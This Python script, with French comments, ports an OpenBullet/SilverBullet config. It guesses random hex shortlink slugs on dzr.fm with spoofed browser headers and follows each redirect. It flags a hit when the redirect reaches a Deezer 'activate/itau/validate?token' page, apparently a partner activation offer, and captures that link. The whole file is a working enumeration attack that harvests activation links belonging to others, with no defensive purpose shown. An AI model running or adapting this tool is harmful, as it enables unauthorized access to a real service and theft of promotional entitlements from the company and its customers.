"""
Équivalent Python d’un scénario type OpenBullet / SilverBullet :
RandomString, GET avec en-têtes, KEYCHECK sur l’URL finale, capture LIEN.
"""

from __future__ import annotations

import re
import secrets
from dataclasses import dataclass
from enum import Enum
from typing import Final

import requests

# Chaînes exactes du scénario OpenBullet + variantes sans locale (/fr/).
_FAILURE_MARKERS: Final[tuple[str, ...]] = (
    "https://www.deezer.com/fr/activate/error?error=SHORLINK_NOT_FOUND",
    "activate/error?error=SHORLINK_NOT_FOUND",
)
_SUCCESS_MARKERS: Final[tuple[str, ...]] = (
    "https://www.deezer.com/fr/activate/itau/validate?token",
    "activate/itau/validate?token",
)

DEFAULT_PATTERN: Final[str] = "?f?f?f?f?f?f"
BASE_URL: Final[str] = "https://dzr.fm/al/"


class KeycheckResult(Enum):
    FAILURE = "failure"
    SUCCESS = "success"
    UNKNOWN = "unknown"


@dataclass
class RunResult:
    keycheck: KeycheckResult
    address: str
    lien: str | None
    slug: str
    status_code: int | None


def random_string_from_pattern(pattern: str = DEFAULT_PATTERN) -> str:
    """
    Motif du type OpenBullet RandomString : chaque « ?f » → un caractère hex aléatoire.
    """

    def _hex_repl(_: re.Match[str]) -> str:
        return secrets.choice("0123456789abcdef")

    return re.sub(r"\?f", _hex_repl, pattern, flags=re.IGNORECASE)


def build_session() -> requests.Session:
    s = requests.Session()
    s.headers.update(
        {
            "Host": "dzr.fm",
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) "
                "Gecko/20100101 Firefox/148.0"
            ),
            "Accept": (
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            ),
            "Accept-Language": "fr,fr-FR;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Sec-GPC": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Priority": "u=0, i",
        }
    )
    return s


def keycheck_address(address: str) -> KeycheckResult:
    if any(m in address for m in _FAILURE_MARKERS):
        return KeycheckResult.FAILURE
    if any(m in address for m in _SUCCESS_MARKERS):
        return KeycheckResult.SUCCESS
    return KeycheckResult.UNKNOWN


def parse_address_to_lien(address: str, create_empty: bool = False) -> str | None:
    """
    PARSE "<ADDRESS>" LR "" "" CreateEmpty=FALSE → CAP « LIEN »
    Avec bornes vides : on expose l’URL finale entière comme LIEN (cas usage typique).
    """
    if not address and not create_empty:
        return None
    return address


def run_once(
    pattern: str = DEFAULT_PATTERN,
    *,
    timeout: float = 30.0,
    session: requests.Session | None = None,
) -> RunResult:
    a = random_string_from_pattern(pattern)
    url = f"{BASE_URL}{a}"
    sess = session or build_session()
    try:
        r = sess.get(url, allow_redirects=True, timeout=timeout)
        address = r.url or ""
        code = r.status_code
    except requests.RequestException:
        address = ""
        code = None

    kc = keycheck_address(address)
    lien = parse_address_to_lien(address, create_empty=False)

    return RunResult(
        keycheck=kc,
        address=address,
        lien=lien,
        slug=a,
        status_code=code,
    )


if __name__ == "__main__":
    res = run_once()
    print("VAR a (slug):", res.slug)
    print("ADDRESS:", res.address)
    print("KEYCHECK:", res.keycheck.value)
    print("CAP LIEN:", res.lien)
